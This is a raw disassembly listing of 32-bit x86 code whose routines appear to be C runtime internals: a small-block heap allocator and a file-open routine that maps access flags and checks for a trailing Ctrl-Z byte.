  405366:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  405369:	75 0c                	jne    0x405377
  40536b:	42                   	inc    %edx
  40536c:	83 c0 08             	add    $0x8,%eax
  40536f:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  405375:	7c ef                	jl     0x405366
  405377:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  40537d:	75 07                	jne    0x405386
  40537f:	51                   	push   %ecx
  405380:	e8 00 ff ff ff       	call   0x405285
  405385:	59                   	pop    %ecx
  405386:	3b 35 dc 99 40 00    	cmp    0x4099dc,%esi
  40538c:	74 0a                	je     0x405398
  40538e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405392:	0f 8f 50 ff ff ff    	jg     0x4052e8
  405398:	5f                   	pop    %edi
  405399:	5e                   	pop    %esi
  40539a:	5b                   	pop    %ebx
  40539b:	c9                   	leave
  40539c:	c3                   	ret
  40539d:	8b 44 24 04          	mov    0x4(%esp),%eax
  4053a1:	ba d8 99 40 00       	mov    $0x4099d8,%edx
  4053a6:	56                   	push   %esi
  4053a7:	8b ca                	mov    %edx,%ecx
  4053a9:	3b 41 10             	cmp    0x10(%ecx),%eax
  4053ac:	76 05                	jbe    0x4053b3
  4053ae:	3b 41 14             	cmp    0x14(%ecx),%eax
  4053b1:	72 08                	jb     0x4053bb
  4053b3:	8b 09                	mov    (%ecx),%ecx
  4053b5:	3b ca                	cmp    %edx,%ecx
  4053b7:	74 37                	je     0x4053f0
  4053b9:	eb ee                	jmp    0x4053a9
  4053bb:	a8 0f                	test   $0xf,%al
  4053bd:	75 31                	jne    0x4053f0
  4053bf:	8b f0                	mov    %eax,%esi
  4053c1:	ba 00 01 00 00       	mov    $0x100,%edx
  4053c6:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
  4053cc:	3b f2                	cmp    %edx,%esi
  4053ce:	72 20                	jb     0x4053f0
  4053d0:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4053d4:	89 0e                	mov    %ecx,(%esi)
  4053d6:	8b 74 24 10          	mov    0x10(%esp),%esi
  4053da:	8b c8                	mov    %eax,%ecx
  4053dc:	66 81 e1 00 f0       	and    $0xf000,%cx
  4053e1:	2b c1                	sub    %ecx,%eax
  4053e3:	89 0e                	mov    %ecx,(%esi)
  4053e5:	2b c2                	sub    %edx,%eax
  4053e7:	5e                   	pop    %esi
  4053e8:	c1 f8 04             	sar    $0x4,%eax
  4053eb:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  4053ef:	c3                   	ret
  4053f0:	33 c0                	xor    %eax,%eax
  4053f2:	5e                   	pop    %esi
  4053f3:	c3                   	ret
  4053f4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4053f8:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4053fc:	2b 48 10             	sub    0x10(%eax),%ecx
  4053ff:	c1 f9 0c             	sar    $0xc,%ecx
  405402:	8d 44 c8 18          	lea    0x18(%eax,%ecx,8),%eax
  405406:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40540a:	0f b6 11             	movzbl (%ecx),%edx
  40540d:	01 10                	add    %edx,(%eax)
  40540f:	80 21 00             	andb   $0x0,(%ecx)
  405412:	81 38 f0 00 00 00    	cmpl   $0xf0,(%eax)
  405418:	c7 40 04 f1 00 00 00 	movl   $0xf1,0x4(%eax)
  40541f:	75 17                	jne    0x405438
  405421:	ff 05 40 bf 40 00    	incl   0x40bf40
  405427:	83 3d 40 bf 40 00 20 	cmpl   $0x20,0x40bf40
  40542e:	75 08                	jne    0x405438
  405430:	6a 10                	push   $0x10
  405432:	e8 a4 fe ff ff       	call   0x4052db
  405437:	59                   	pop    %ecx
  405438:	c3                   	ret
  405439:	55                   	push   %ebp
  40543a:	8b ec                	mov    %esp,%ebp
  40543c:	51                   	push   %ecx
  40543d:	51                   	push   %ecx
  40543e:	53                   	push   %ebx
  40543f:	56                   	push   %esi
  405440:	8b 35 f8 b9 40 00    	mov    0x40b9f8,%esi
  405446:	57                   	push   %edi
  405447:	8b 56 10             	mov    0x10(%esi),%edx
  40544a:	83 fa ff             	cmp    $0xffffffff,%edx
  40544d:	0f 84 9f 00 00 00    	je     0x4054f2
  405453:	8b 7e 08             	mov    0x8(%esi),%edi
  405456:	8d 8e 18 20 00 00    	lea    0x2018(%esi),%ecx
  40545c:	8b c7                	mov    %edi,%eax
  40545e:	2b c6                	sub    %esi,%eax
  405460:	83 e8 18             	sub    $0x18,%eax
  405463:	c1 f8 03             	sar    $0x3,%eax
  405466:	c1 e0 0c             	shl    $0xc,%eax
  405469:	03 c2                	add    %edx,%eax
  40546b:	3b f9                	cmp    %ecx,%edi
  40546d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405470:	73 3a                	jae    0x4054ac
  405472:	8b 0f                	mov    (%edi),%ecx
  405474:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405477:	3b cb                	cmp    %ebx,%ecx
  405479:	7c 1a                	jl     0x405495
  40547b:	39 5f 04             	cmp    %ebx,0x4(%edi)
  40547e:	76 15                	jbe    0x405495
  405480:	53                   	push   %ebx
  405481:	51                   	push   %ecx
  405482:	50                   	push   %eax
  405483:	e8 b9 01 00 00       	call   0x405641
  405488:	83 c4 0c             	add    $0xc,%esp
  40548b:	85 c0                	test   %eax,%eax
  40548d:	75 75                	jne    0x405504
  40548f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405492:	89 5f 04             	mov    %ebx,0x4(%edi)
  405495:	83 c7 08             	add    $0x8,%edi
  405498:	8d 8e 18 20 00 00    	lea    0x2018(%esi),%ecx
  40549e:	05 00 10 00 00       	add    $0x1000,%eax
  4054a3:	3b f9                	cmp    %ecx,%edi
  4054a5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4054a8:	72 c8                	jb     0x405472
  4054aa:	eb 03                	jmp    0x4054af
  4054ac:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4054af:	8b 46 08             	mov    0x8(%esi),%eax
  4054b2:	8b 4e 10             	mov    0x10(%esi),%ecx
  4054b5:	8d 7e 18             	lea    0x18(%esi),%edi
  4054b8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4054bb:	3b f8                	cmp    %eax,%edi
  4054bd:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4054c0:	73 33                	jae    0x4054f5
  4054c2:	8b 07                	mov    (%edi),%eax
  4054c4:	3b c3                	cmp    %ebx,%eax
  4054c6:	7c 19                	jl     0x4054e1
  4054c8:	39 5f 04             	cmp    %ebx,0x4(%edi)
  4054cb:	76 14                	jbe    0x4054e1
  4054cd:	53                   	push   %ebx
  4054ce:	50                   	push   %eax
  4054cf:	ff 75 fc             	push   -0x4(%ebp)
  4054d2:	e8 6a 01 00 00       	call   0x405641
  4054d7:	83 c4 0c             	add    $0xc,%esp
  4054da:	85 c0                	test   %eax,%eax
  4054dc:	75 26                	jne    0x405504
  4054de:	89 5f 04             	mov    %ebx,0x4(%edi)
  4054e1:	81 45 fc 00 10 00 00 	addl   $0x1000,-0x4(%ebp)
  4054e8:	83 c7 08             	add    $0x8,%edi
  4054eb:	3b 7d f8             	cmp    -0x8(%ebp),%edi
  4054ee:	72 d2                	jb     0x4054c2
  4054f0:	eb 03                	jmp    0x4054f5
  4054f2:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4054f5:	8b 36                	mov    (%esi),%esi
  4054f7:	3b 35 f8 b9 40 00    	cmp    0x40b9f8,%esi
  4054fd:	74 15                	je     0x405514
  4054ff:	e9 43 ff ff ff       	jmp    0x405447
  405504:	89 35 f8 b9 40 00    	mov    %esi,0x40b9f8
  40550a:	29 1f                	sub    %ebx,(%edi)
  40550c:	89 7e 08             	mov    %edi,0x8(%esi)
  40550f:	e9 28 01 00 00       	jmp    0x40563c
  405514:	b8 d8 99 40 00       	mov    $0x4099d8,%eax
  405519:	8b f8                	mov    %eax,%edi
  40551b:	83 7f 10 ff          	cmpl   $0xffffffff,0x10(%edi)
  40551f:	74 06                	je     0x405527
  405521:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  405525:	75 0c                	jne    0x405533
  405527:	8b 3f                	mov    (%edi),%edi
  405529:	3b f8                	cmp    %eax,%edi
  40552b:	0f 84 d7 00 00 00    	je     0x405608
  405531:	eb e8                	jmp    0x40551b
  405533:	8b 5f 0c             	mov    0xc(%edi),%ebx
  405536:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40553a:	8b f3                	mov    %ebx,%esi
  40553c:	8b c3                	mov    %ebx,%eax
  40553e:	2b f7                	sub    %edi,%esi
  405540:	83 ee 18             	sub    $0x18,%esi
  405543:	c1 fe 03             	sar    $0x3,%esi
  405546:	c1 e6 0c             	shl    $0xc,%esi
  405549:	03 77 10             	add    0x10(%edi),%esi
  40554c:	83 3b ff             	cmpl   $0xffffffff,(%ebx)
  40554f:	75 11                	jne    0x405562
  405551:	83 7d fc 10          	cmpl   $0x10,-0x4(%ebp)
  405555:	7d 0b                	jge    0x405562
  405557:	83 c0 08             	add    $0x8,%eax
  40555a:	ff 45 fc             	incl   -0x4(%ebp)
  40555d:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  405560:	74 ef                	je     0x405551
  405562:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405565:	6a 04                	push   $0x4
  405567:	c1 e0 0c             	shl    $0xc,%eax
  40556a:	68 00 10 00 00       	push   $0x1000
  40556f:	50                   	push   %eax
  405570:	56                   	push   %esi
  405571:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405574:	ff 15 bc 80 40 00    	call   *0x4080bc
  40557a:	3b c6                	cmp    %esi,%eax
  40557c:	0f 85 b8 00 00 00    	jne    0x40563a
  405582:	6a 00                	push   $0x0
  405584:	ff 75 f8             	push   -0x8(%ebp)
  405587:	56                   	push   %esi
  405588:	e8 43 12 00 00       	call   0x4067d0
  40558d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405590:	83 c4 0c             	add    $0xc,%esp
  405593:	85 d2                	test   %edx,%edx
  405595:	8b cb                	mov    %ebx,%ecx
  405597:	7e 30                	jle    0x4055c9
  405599:	8d 46 04             	lea    0x4(%esi),%eax
  40559c:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40559f:	80 88 f4 00 00 00 ff 	orb    $0xff,0xf4(%eax)
  4055a6:	8d 50 04             	lea    0x4(%eax),%edx
  4055a9:	89 50 fc             	mov    %edx,-0x4(%eax)
  4055ac:	ba f0 00 00 00       	mov    $0xf0,%edx
  4055b1:	89 10                	mov    %edx,(%eax)
  4055b3:	89 11                	mov    %edx,(%ecx)
  4055b5:	c7 41 04 f1 00 00 00 	movl   $0xf1,0x4(%ecx)
  4055bc:	05 00 10 00 00       	add    $0x1000,%eax
  4055c1:	83 c1 08             	add    $0x8,%ecx
  4055c4:	ff 4d fc             	decl   -0x4(%ebp)
  4055c7:	75 d6                	jne    0x40559f
  4055c9:	89 3d f8 b9 40 00    	mov    %edi,0x40b9f8
  4055cf:	8d 87 18 20 00 00    	lea    0x2018(%edi),%eax
  4055d5:	3b c8                	cmp    %eax,%ecx
  4055d7:	73 0c                	jae    0x4055e5
  4055d9:	83 39 ff             	cmpl   $0xffffffff,(%ecx)
  4055dc:	74 05                	je     0x4055e3
  4055de:	83 c1 08             	add    $0x8,%ecx
  4055e1:	eb f2                	jmp    0x4055d5
  4055e3:	3b c8                	cmp    %eax,%ecx
  4055e5:	1b c0                	sbb    %eax,%eax
  4055e7:	23 c1                	and    %ecx,%eax
  4055e9:	89 47 0c             	mov    %eax,0xc(%edi)
  4055ec:	8b 45 08             	mov    0x8(%ebp),%eax
  4055ef:	88 46 08             	mov    %al,0x8(%esi)
  4055f2:	89 5f 08             	mov    %ebx,0x8(%edi)
  4055f5:	29 03                	sub    %eax,(%ebx)
  4055f7:	29 46 04             	sub    %eax,0x4(%esi)
  4055fa:	8d 4c 06 08          	lea    0x8(%esi,%eax,1),%ecx
  4055fe:	8d 86 00 01 00 00    	lea    0x100(%esi),%eax
  405604:	89 0e                	mov    %ecx,(%esi)
  405606:	eb 34                	jmp    0x40563c
  405608:	e8 34 fb ff ff       	call   0x405141
  40560d:	85 c0                	test   %eax,%eax
  40560f:	74 29                	je     0x40563a
  405611:	8b 48 10             	mov    0x10(%eax),%ecx
  405614:	88 59 08             	mov    %bl,0x8(%ecx)
  405617:	8d 54 19 08          	lea    0x8(%ecx,%ebx,1),%edx
  40561b:	a3 f8 b9 40 00       	mov    %eax,0x40b9f8
  405620:	89 11                	mov    %edx,(%ecx)
  405622:	ba f0 00 00 00       	mov    $0xf0,%edx
  405627:	2b d3                	sub    %ebx,%edx
  405629:	89 51 04             	mov    %edx,0x4(%ecx)
  40562c:	0f b6 d3             	movzbl %bl,%edx
  40562f:	29 50 18             	sub    %edx,0x18(%eax)
  405632:	8d 81 00 01 00 00    	lea    0x100(%ecx),%eax
  405638:	eb 02                	jmp    0x40563c
  40563a:	33 c0                	xor    %eax,%eax
  40563c:	5f                   	pop    %edi
  40563d:	5e                   	pop    %esi
  40563e:	5b                   	pop    %ebx
  40563f:	c9                   	leave
  405640:	c3                   	ret
  405641:	55                   	push   %ebp
  405642:	8b ec                	mov    %esp,%ebp
  405644:	51                   	push   %ecx
  405645:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405648:	8b 55 10             	mov    0x10(%ebp),%edx
  40564b:	53                   	push   %ebx
  40564c:	56                   	push   %esi
  40564d:	8b 71 04             	mov    0x4(%ecx),%esi
  405650:	57                   	push   %edi
  405651:	8b 39                	mov    (%ecx),%edi
  405653:	8d 99 f8 00 00 00    	lea    0xf8(%ecx),%ebx
  405659:	3b f2                	cmp    %edx,%esi
  40565b:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40565e:	8b c7                	mov    %edi,%eax
  405660:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405663:	72 21                	jb     0x405686
  405665:	8d 04 17             	lea    (%edi,%edx,1),%eax
  405668:	88 17                	mov    %dl,(%edi)
  40566a:	3b c3                	cmp    %ebx,%eax
  40566c:	73 07                	jae    0x405675
  40566e:	01 11                	add    %edx,(%ecx)
  405670:	29 51 04             	sub    %edx,0x4(%ecx)
  405673:	eb 09                	jmp    0x40567e
  405675:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  405679:	8d 41 08             	lea    0x8(%ecx),%eax
  40567c:	89 01                	mov    %eax,(%ecx)
  40567e:	8d 47 08             	lea    0x8(%edi),%eax
  405681:	e9 ce 00 00 00       	jmp    0x405754
  405686:	03 f7                	add    %edi,%esi
  405688:	80 3e 00             	cmpb   $0x0,(%esi)
  40568b:	74 02                	je     0x40568f
  40568d:	8b c6                	mov    %esi,%eax
  40568f:	8d 34 10             	lea    (%eax,%edx,1),%esi
  405692:	3b f3                	cmp    %ebx,%esi
  405694:	73 43                	jae    0x4056d9
  405696:	8a 18                	mov    (%eax),%bl
  405698:	84 db                	test   %bl,%bl
  40569a:	75 30                	jne    0x4056cc
  40569c:	6a 01                	push   $0x1
  40569e:	8d 58 01             	lea    0x1(%eax),%ebx
  4056a1:	5e                   	pop    %esi
  4056a2:	80 3b 00             	cmpb   $0x0,(%ebx)
  4056a5:	75 04                	jne    0x4056ab
  4056a7:	43                   	inc    %ebx
  4056a8:	46                   	inc    %esi
  4056a9:	eb f7                	jmp    0x4056a2
  4056ab:	3b f2                	cmp    %edx,%esi
  4056ad:	73 4e                	jae    0x4056fd
  4056af:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  4056b2:	75 05                	jne    0x4056b9
  4056b4:	89 71 04             	mov    %esi,0x4(%ecx)
  4056b7:	eb 0c                	jmp    0x4056c5
  4056b9:	29 75 0c             	sub    %esi,0xc(%ebp)
  4056bc:	39 55 0c             	cmp    %edx,0xc(%ebp)
  4056bf:	0f 82 99 00 00 00    	jb     0x40575e
  4056c5:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4056c8:	8b c3                	mov    %ebx,%eax
  4056ca:	eb 05                	jmp    0x4056d1
  4056cc:	0f b6 f3             	movzbl %bl,%esi
  4056cf:	03 c6                	add    %esi,%eax
  4056d1:	8d 34 10             	lea    (%eax,%edx,1),%esi
  4056d4:	3b 75 08             	cmp    0x8(%ebp),%esi
  4056d7:	72 bd                	jb     0x405696
  4056d9:	8d 71 08             	lea    0x8(%ecx),%esi
  4056dc:	3b f7                	cmp    %edi,%esi
  4056de:	73 7e                	jae    0x40575e
  4056e0:	8d 04 16             	lea    (%esi,%edx,1),%eax
  4056e3:	3b 45 08             	cmp    0x8(%ebp),%eax
  4056e6:	73 76                	jae    0x40575e
  4056e8:	8a 06                	mov    (%esi),%al
  4056ea:	84 c0                	test   %al,%al
  4056ec:	75 40                	jne    0x40572e
  4056ee:	6a 01                	push   $0x1
  4056f0:	8d 5e 01             	lea    0x1(%esi),%ebx
  4056f3:	58                   	pop    %eax
  4056f4:	80 3b 00             	cmpb   $0x0,(%ebx)
  4056f7:	75 25                	jne    0x40571e
  4056f9:	43                   	inc    %ebx
  4056fa:	40                   	inc    %eax
  4056fb:	eb f7                	jmp    0x4056f4
  4056fd:	8d 1c 10             	lea    (%eax,%edx,1),%ebx
  405700:	3b 5d 08             	cmp    0x8(%ebp),%ebx
  405703:	73 09                	jae    0x40570e
  405705:	2b f2                	sub    %edx,%esi
  405707:	89 19                	mov    %ebx,(%ecx)
  405709:	89 71 04             	mov    %esi,0x4(%ecx)
  40570c:	eb 09                	jmp    0x405717
  40570e:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  405712:	8d 71 08             	lea    0x8(%ecx),%esi
  405715:	89 31                	mov    %esi,(%ecx)
  405717:	88 10                	mov    %dl,(%eax)
  405719:	83 c0 08             	add    $0x8,%eax
  40571c:	eb 36                	jmp    0x405754
  40571e:	3b c2                	cmp    %edx,%eax
  405720:	73 13                	jae    0x405735
  405722:	29 45 0c             	sub    %eax,0xc(%ebp)
  405725:	39 55 0c             	cmp    %edx,0xc(%ebp)
  405728:	72 34                	jb     0x40575e
  40572a:	8b f3                	mov    %ebx,%esi
  40572c:	eb ae                	jmp    0x4056dc
  40572e:	0f b6 c0             	movzbl %al,%eax
  405731:	03 f0                	add    %eax,%esi
  405733:	eb a7                	jmp    0x4056dc
  405735:	8d 1c 16             	lea    (%esi,%edx,1),%ebx
  405738:	3b 5d 08             	cmp    0x8(%ebp),%ebx
  40573b:	73 09                	jae    0x405746
  40573d:	2b c2                	sub    %edx,%eax
  40573f:	89 19                	mov    %ebx,(%ecx)
  405741:	89 41 04             	mov    %eax,0x4(%ecx)
  405744:	eb 09                	jmp    0x40574f
  405746:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  40574a:	8d 41 08             	lea    0x8(%ecx),%eax
  40574d:	89 01                	mov    %eax,(%ecx)
  40574f:	88 16                	mov    %dl,(%esi)
  405751:	8d 46 08             	lea    0x8(%esi),%eax
  405754:	6b c9 0f             	imul   $0xf,%ecx,%ecx
  405757:	c1 e0 04             	shl    $0x4,%eax
  40575a:	2b c1                	sub    %ecx,%eax
  40575c:	eb 02                	jmp    0x405760
  40575e:	33 c0                	xor    %eax,%eax
  405760:	5f                   	pop    %edi
  405761:	5e                   	pop    %esi
  405762:	5b                   	pop    %ebx
  405763:	c9                   	leave
  405764:	c3                   	ret
  405765:	55                   	push   %ebp
  405766:	8b ec                	mov    %esp,%ebp
  405768:	83 ec 1c             	sub    $0x1c,%esp
  40576b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40576e:	53                   	push   %ebx
  40576f:	33 db                	xor    %ebx,%ebx
  405771:	56                   	push   %esi
  405772:	f6 c1 80             	test   $0x80,%cl
  405775:	57                   	push   %edi
  405776:	c7 45 e4 0c 00 00 00 	movl   $0xc,-0x1c(%ebp)
  40577d:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  405780:	74 09                	je     0x40578b
  405782:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  405785:	c6 45 ff 10          	movb   $0x10,-0x1(%ebp)
  405789:	eb 0b                	jmp    0x405796
  40578b:	80 65 ff 00          	andb   $0x0,-0x1(%ebp)
  40578f:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  405796:	b8 00 80 00 00       	mov    $0x8000,%eax
  40579b:	85 c8                	test   %ecx,%eax
  40579d:	75 11                	jne    0x4057b0
  40579f:	f6 c5 40             	test   $0x40,%ch
  4057a2:	75 08                	jne    0x4057ac
  4057a4:	39 05 80 bf 40 00    	cmp    %eax,0x40bf80
  4057aa:	74 04                	je     0x4057b0
  4057ac:	80 4d ff 80          	orb    $0x80,-0x1(%ebp)
  4057b0:	6a 03                	push   $0x3
  4057b2:	8b c1                	mov    %ecx,%eax
  4057b4:	5e                   	pop    %esi
  4057b5:	23 c6                	and    %esi,%eax
  4057b7:	2b c3                	sub    %ebx,%eax
  4057b9:	74 2d                	je     0x4057e8
  4057bb:	48                   	dec    %eax
  4057bc:	74 21                	je     0x4057df
  4057be:	48                   	dec    %eax
  4057bf:	74 15                	je     0x4057d6
  4057c1:	c7 05 e4 bd 40 00 16 	movl   $0x16,0x40bde4
  4057c8:	00 00 00 
  4057cb:	89 1d e8 bd 40 00    	mov    %ebx,0x40bde8
  4057d1:	e9 25 02 00 00       	jmp    0x4059fb
  4057d6:	c7 45 f4 00 00 00 c0 	movl   $0xc0000000,-0xc(%ebp)
  4057dd:	eb 10                	jmp    0x4057ef
  4057df:	c7 45 f4 00 00 00 40 	movl   $0x40000000,-0xc(%ebp)
  4057e6:	eb 07                	jmp    0x4057ef
  4057e8:	c7 45 f4 00 00 00 80 	movl   $0x80000000,-0xc(%ebp)
  4057ef:	8b 45 10             	mov    0x10(%ebp),%eax
  4057f2:	83 f8 10             	cmp    $0x10,%eax
  4057f5:	74 26                	je     0x40581d
  4057f7:	83 f8 20             	cmp    $0x20,%eax
  4057fa:	74 18                	je     0x405814
  4057fc:	83 f8 30             	cmp    $0x30,%eax
  4057ff:	74 0a                	je     0x40580b
  405801:	83 f8 40             	cmp    $0x40,%eax
  405804:	75 bb                	jne    0x4057c1
  405806:	89 75 f0             	mov    %esi,-0x10(%ebp)
  405809:	eb 15                	jmp    0x405820
  40580b:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  405812:	eb 0c                	jmp    0x405820
  405814:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  40581b:	eb 03                	jmp    0x405820
  40581d:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  405820:	ba 00 07 00 00       	mov    $0x700,%edx
  405825:	b8 00 04 00 00       	mov    $0x400,%eax
  40582a:	23 ca                	and    %edx,%ecx
  40582c:	bf 00 01 00 00       	mov    $0x100,%edi
  405831:	3b c8                	cmp    %eax,%ecx
  405833:	7f 35                	jg     0x40586a
  405835:	74 2e                	je     0x405865
  405837:	3b cb                	cmp    %ebx,%ecx
  405839:	74 2a                	je     0x405865
  40583b:	3b cf                	cmp    %edi,%ecx
  40583d:	74 1d                	je     0x40585c
  40583f:	81 f9 00 02 00 00    	cmp    $0x200,%ecx
  405845:	74 3c                	je     0x405883
  405847:	81 f9 00 03 00 00    	cmp    $0x300,%ecx
  40584d:	0f 85 6e ff ff ff    	jne    0x4057c1
  405853:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
  40585a:	eb 37                	jmp    0x405893
  40585c:	c7 45 f8 04 00 00 00 	movl   $0x4,-0x8(%ebp)
  405863:	eb 2e                	jmp    0x405893
  405865:	89 75 f8             	mov    %esi,-0x8(%ebp)
  405868:	eb 29                	jmp    0x405893
  40586a:	81 f9 00 05 00 00    	cmp    $0x500,%ecx
  405870:	74 1a                	je     0x40588c
  405872:	81 f9 00 06 00 00    	cmp    $0x600,%ecx
  405878:	74 09                	je     0x405883
  40587a:	3b ca                	cmp    %edx,%ecx
  40587c:	74 0e                	je     0x40588c
  40587e:	e9 3e ff ff ff       	jmp    0x4057c1
  405883:	c7 45 f8 05 00 00 00 	movl   $0x5,-0x8(%ebp)
  40588a:	eb 07                	jmp    0x405893
  40588c:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  405893:	8b 45 0c             	mov    0xc(%ebp),%eax
  405896:	be 80 00 00 00       	mov    $0x80,%esi
  40589b:	85 c7                	test   %eax,%edi
  40589d:	74 13                	je     0x4058b2
  40589f:	8b 0d ec bd 40 00    	mov    0x40bdec,%ecx
  4058a5:	f7 d1                	not    %ecx
  4058a7:	23 4d 14             	and    0x14(%ebp),%ecx
  4058aa:	f6 c1 80             	test   $0x80,%cl
  4058ad:	75 03                	jne    0x4058b2
  4058af:	6a 01                	push   $0x1
  4058b1:	5e                   	pop    %esi
  4058b2:	a8 40                	test   $0x40,%al
  4058b4:	74 0a                	je     0x4058c0
  4058b6:	81 ce 00 00 00 04    	or     $0x4000000,%esi
  4058bc:	80 4d f6 01          	orb    $0x1,-0xa(%ebp)
  4058c0:	f6 c4 10             	test   $0x10,%ah
  4058c3:	74 02                	je     0x4058c7
  4058c5:	0b f7                	or     %edi,%esi
  4058c7:	a8 20                	test   $0x20,%al
  4058c9:	74 08                	je     0x4058d3
  4058cb:	81 ce 00 00 00 08    	or     $0x8000000,%esi
  4058d1:	eb 0a                	jmp    0x4058dd
  4058d3:	a8 10                	test   $0x10,%al
  4058d5:	74 06                	je     0x4058dd
  4058d7:	81 ce 00 00 00 10    	or     $0x10000000,%esi
  4058dd:	e8 03 ec ff ff       	call   0x4044e5
  4058e2:	8b d8                	mov    %eax,%ebx
  4058e4:	83 cf ff             	or     $0xffffffff,%edi
  4058e7:	3b df                	cmp    %edi,%ebx
  4058e9:	75 13                	jne    0x4058fe
  4058eb:	83 25 e8 bd 40 00 00 	andl   $0x0,0x40bde8
  4058f2:	c7 05 e4 bd 40 00 18 	movl   $0x18,0x40bde4
  4058f9:	00 00 00 
  4058fc:	eb 3e                	jmp    0x40593c
  4058fe:	6a 00                	push   $0x0
  405900:	56                   	push   %esi
  405901:	ff 75 f8             	push   -0x8(%ebp)
  405904:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405907:	50                   	push   %eax
  405908:	ff 75 f0             	push   -0x10(%ebp)
  40590b:	ff 75 f4             	push   -0xc(%ebp)
  40590e:	ff 75 08             	push   0x8(%ebp)
  405911:	ff 15 c4 80 40 00    	call   *0x4080c4
  405917:	8b f0                	mov    %eax,%esi
  405919:	3b f7                	cmp    %edi,%esi
  40591b:	74 12                	je     0x40592f
  40591d:	56                   	push   %esi
  40591e:	ff 15 70 80 40 00    	call   *0x408070
  405924:	85 c0                	test   %eax,%eax
  405926:	75 1b                	jne    0x405943
  405928:	56                   	push   %esi
  405929:	ff 15 78 80 40 00    	call   *0x408078
  40592f:	ff 15 60 80 40 00    	call   *0x408060
  405935:	50                   	push   %eax
  405936:	e8 43 eb ff ff       	call   0x40447e
  40593b:	59                   	pop    %ecx
  40593c:	8b c7                	mov    %edi,%eax
  40593e:	e9 d6 00 00 00       	jmp    0x405a19
  405943:	83 f8 02             	cmp    $0x2,%eax
  405946:	75 06                	jne    0x40594e
  405948:	80 4d ff 40          	orb    $0x40,-0x1(%ebp)
  40594c:	eb 09                	jmp    0x405957
  40594e:	83 f8 03             	cmp    $0x3,%eax
  405951:	75 04                	jne    0x405957
  405953:	80 4d ff 08          	orb    $0x8,-0x1(%ebp)
  405957:	56                   	push   %esi
  405958:	53                   	push   %ebx
  405959:	e8 1c ec ff ff       	call   0x40457a
  40595e:	59                   	pop    %ecx
  40595f:	8a 45 ff             	mov    -0x1(%ebp),%al
  405962:	59                   	pop    %ecx
  405963:	8b f3                	mov    %ebx,%esi
  405965:	8b cb                	mov    %ebx,%ecx
  405967:	0c 01                	or     $0x1,%al
  405969:	c1 f9 05             	sar    $0x5,%ecx
  40596c:	83 e6 1f             	and    $0x1f,%esi
  40596f:	88 45 0b             	mov    %al,0xb(%ebp)
  405972:	8d 3c 8d e0 c1 40 00 	lea    0x40c1e0(,%ecx,4),%edi
  405979:	c1 e6 03             	shl    $0x3,%esi
  40597c:	8b 0f                	mov    (%edi),%ecx
  40597e:	80 65 0b 48          	andb   $0x48,0xb(%ebp)
  405982:	88 44 31 04          	mov    %al,0x4(%ecx,%esi,1)
  405986:	75 78                	jne    0x405a00
  405988:	a8 80                	test   $0x80,%al
  40598a:	74 74                	je     0x405a00
  40598c:	f6 45 0c 02          	testb  $0x2,0xc(%ebp)
  405990:	74 6e                	je     0x405a00
  405992:	6a 02                	push   $0x2
  405994:	6a ff                	push   $0xffffffff
  405996:	53                   	push   %ebx
  405997:	e8 49 d4 ff ff       	call   0x402de5
  40599c:	83 c4 0c             	add    $0xc,%esp
  40599f:	83 f8 ff             	cmp    $0xffffffff,%eax
  4059a2:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4059a5:	75 0e                	jne    0x4059b5
  4059a7:	81 3d e8 bd 40 00 83 	cmpl   $0x83,0x40bde8
  4059ae:	00 00 00 
  4059b1:	74 4d                	je     0x405a00
  4059b3:	eb 3f                	jmp    0x4059f4
  4059b5:	80 65 13 00          	andb   $0x0,0x13(%ebp)
  4059b9:	8d 45 13             	lea    0x13(%ebp),%eax
  4059bc:	6a 01                	push   $0x1
  4059be:	50                   	push   %eax
  4059bf:	53                   	push   %ebx
  4059c0:	e8 e6 12 00 00       	call   0x406cab
  4059c5:	83 c4 0c             	add    $0xc,%esp
  4059c8:	85 c0                	test   %eax,%eax
  4059ca:	75 16                	jne    0x4059e2
  4059cc:	80 7d 13 1a          	cmpb   $0x1a,0x13(%ebp)
  4059d0:	75 10                	jne    0x4059e2
  4059d2:	ff 75 f0             	push   -0x10(%ebp)
  4059d5:	53                   	push   %ebx
  4059d6:	e8 8a 11 00 00       	call   0x406b65
